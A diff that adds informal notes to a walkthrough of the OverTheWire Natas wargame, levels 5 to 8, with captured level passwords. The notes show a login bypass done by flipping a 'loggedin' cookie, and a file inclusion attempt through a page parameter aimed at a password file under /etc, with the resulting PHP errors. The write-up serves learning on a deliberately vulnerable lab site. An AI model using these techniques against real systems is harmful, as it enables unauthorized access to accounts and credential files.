@@ -31,8 +31,33 @@
 >* iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
 
 * **5->6**
-> *
-> *
-> *
-> *
-> *
+> * Well, let’s trick the server into believing we’re logged in. Let’s see what Fiddler reveals in the server response body.
+> * HTTP/1.1 200 OK
+Date: Thu, 27 Oct 2016 21:18:31 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.20
+Set-Cookie: **loggedin=0**
+Vary: Accept-Encoding
+Content-Length: 855
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+> *  changing cookes to logedin
+> * aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+* **6->7**
+> * klicked inspect element 
+> * found index-source.html
+> * gone http://natas6.natas.labs.overthewire.org/index-source.html
+> * found includes/secret.inc
+> * gone 
+> * found FOEIUWGHFEEUHOFUOIU
+> * natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+* **7->8**
+>*  hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
+>* nothing http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8
+>* http://natas7.natas.labs.overthewire.org/index.php?page=home/etc/natas_webpass/natas8 ---> two errors 
+>* Warning: include(home/etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
+
+>* Warning: include(): Failed opening 'home/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
